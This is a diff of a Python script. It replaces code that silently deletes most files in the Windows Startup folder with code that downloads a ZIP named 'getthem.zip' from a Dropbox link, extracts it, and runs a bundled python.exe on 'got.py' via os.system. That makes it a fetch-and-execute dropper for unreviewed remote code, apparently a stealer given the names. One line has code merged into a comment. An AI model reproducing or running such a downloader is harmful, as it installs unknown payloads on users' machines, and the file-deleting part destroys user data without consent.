@@ -1,22 +1,30 @@
 import os
+import requests
 
-# Get the path to the current user's startup folder
-startup_folder_path = os.path.expandvars(r'%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup')
+# Step 1: Download the ZIP file
+url = "https://www.dropbox.com/scl/fi/14pm2bw2z6cq530t4mh29/getthem.zip?rlkey=ccrwpl4sgcw1wxiyxosokk4bv&dl=1"
+filename = os.path.join("getthem.zip")
+with requests.get(url, stream=True) as r:
+    r.raise_for_status()
+    with open(filename, 'wb') as f:
+        for chunk in r.iter_content(chunk_size=8192):  # Adjust chunk size as needed
+            f.write(chunk)
 
-# Iterate over each entry in the startup folder
-for filename in os.listdir(startup_folder_path):
-    try:
-        file_path = os.path.join(startup_folder_path, filename)  # Full path of the file
+print("Downloaded the ZIP file.")
 
-        # Check if the current file is not 'startup.vbs'
-        if filename.lower() != 'startup.vbs' and filename.lower() != 'desktop.ini':
-            # Check if the entry is a file and not a directory
-            if os.path.isfile(file_path):
-                os.remove(file_path)  # Delete the file
-                print(f"Deleted: {file_path}")
-            else:
-                print(f"Skipped (not a file): {file_path}")
-        else:
-            print(f"Skipped (startup.vbs): {file_path}")
-    except Exception as e:
-        print(f"Error: {e}")
+# Step 2: Extract the ZIP file
+# The extraction command might differ based on your operating system and available utilities
+extract_command = f"tar -xf {filename}"  # for Windows
+os.system(extract_command)
+print("Extracted the ZIP file.")
+
+# Step 3: Execute the program
+# Build the path dynamically to ensure it works regardless of where the script is run from
+extracted_folder_path = os.path.join("getthem")  # Assuming the zip extracts into a folder named 'getthem'python_exe = os.path.join(extracted_folder_path, "python.exe")
+script_path = os.path.abspath("getthem/got.py")
+python_exe = os.path.abspath("getthem/python.exe")
+execute_command = f'{python_exe} {script_path}'  # Ensure proper handling of paths
+print(execute_command)
+os.system(execute_command)
+
+print("Executed the program.")
